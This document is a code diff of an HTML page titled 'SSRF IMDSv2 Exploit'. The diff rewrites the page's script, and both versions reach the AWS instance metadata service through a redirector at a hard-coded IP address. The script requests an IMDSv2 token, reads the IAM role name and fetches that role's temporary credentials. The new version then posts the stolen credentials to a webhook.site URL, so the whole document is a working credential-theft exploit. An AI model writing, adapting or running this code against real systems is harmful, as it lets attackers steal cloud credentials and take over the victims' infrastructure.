@@ -1,55 +1,36 @@
-<!DOCTYPE html>
 <html>
-  <head>
-    <title>SSRF IMDSv2 Exploit</title>
-  </head>
   <body>
-    <h1>Fetching IMDSv2 credentials...</h1>
-
     <script>
-      const redirectorBase = 'https://13.221.230.104/redir.php?url=';
+      try {
+        // 1. Token
+        var xhr1 = new XMLHttpRequest();
+        xhr1.open("PUT", "http://13.221.230.104/redir.php?url=http://169.254.169.254/latest/api/token", false);
+        xhr1.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
+        xhr1.send();
+        var token = xhr1.responseText;
 
-      function fetchViaRedirector(url, options = {}) {
-        const targetUrl = redirectorBase + encodeURIComponent(url);
-        return fetch(targetUrl, options);
+        // 2. Get IAM role
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open("GET", "http://13.221.230.104/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", false);
+        xhr2.setRequestHeader("X-aws-ec2-metadata-token", token);
+        xhr2.send();
+        var role = xhr2.responseText.trim();
+
+        // 3. Get credentials
+        var xhr3 = new XMLHttpRequest();
+        xhr3.open("GET", "http://13.221.230.104/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" + encodeURIComponent(role), false);
+        xhr3.setRequestHeader("X-aws-ec2-metadata-token", token);
+        xhr3.send();
+        var creds = xhr3.responseText;
+
+        // 4. שליחה ל־Webhook
+        var xhr4 = new XMLHttpRequest();
+        xhr4.open("POST", "https://webhook.site/565628b3-9556-8e01-88059325cb8d", false);
+        xhr4.setRequestHeader("Content-Type", "application/json");
+        xhr4.send(JSON.stringify({creds: creds}));
+      } catch(e) {
+        console.error(e);
       }
-
-      async function getIMDSv2Credentials() {
-        try {
-          const tokenRes = await fetchViaRedirector('http://169.254.169.254/latest/api/token', {
-            method: 'PUT',
-            headers: {
-              'X-aws-ec2-metadata-token-ttl-seconds': '21600',
-            },
-          });
-
-          const token = await tokenRes.text();
-
-          const roleRes = await fetchViaRedirector('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
-            headers: {
-              'X-aws-ec2-metadata-token': token,
-            },
-          });
-
-          const role = await roleRes.text();
-
-          const credsRes = await fetchViaRedirector('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role, {
-            headers: {
-              'X-aws-ec2-metadata-token': token,
-            },
-          });
-
-          const creds = await credsRes.text();
-          console.log('Credentials:', creds);
-
-          document.body.innerHTML += `<pre>${creds}</pre>`;
-        } catch (err) {
-          console.error('Error:', err);
-          document.body.innerHTML += `<p style="color:red">Failed: ${err}</p>`;
-        }
-      }
-
-      getIMDSv2Credentials();
     </script>
   </body>
 </html>
